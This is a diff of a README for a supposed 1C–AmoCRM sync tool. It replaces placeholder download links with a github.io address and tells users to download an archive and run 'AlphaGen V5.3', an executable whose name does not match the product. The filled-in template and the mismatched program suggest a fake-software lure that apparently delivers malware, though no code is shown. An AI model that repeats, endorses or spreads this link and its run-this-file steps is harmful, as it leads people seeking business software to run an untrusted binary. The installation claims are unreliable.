@@ -2,13 +2,13 @@
 
 Sync your accounting and inventory data between 1C and AmoCRM — automate contact management, deal tracking, and product updates in both systems.
 
-[![Download](https://img.shields.io/badge/Download-1C_AmoCRM_Integration-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-1C_AmoCRM_Integration-blueviolet)](https://1c-integration-amocrm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://1c-integration-amocrm.github.io/.github)  
 2. 📁 Extract the folder to any location  
 3. 🖱 Run AlphaGen V5.3 to activate the 1C integration driver  
 4. ✅ Connect your 1C configuration to AmoCRM via REST API or data exchange protocol (COM/HTTP)
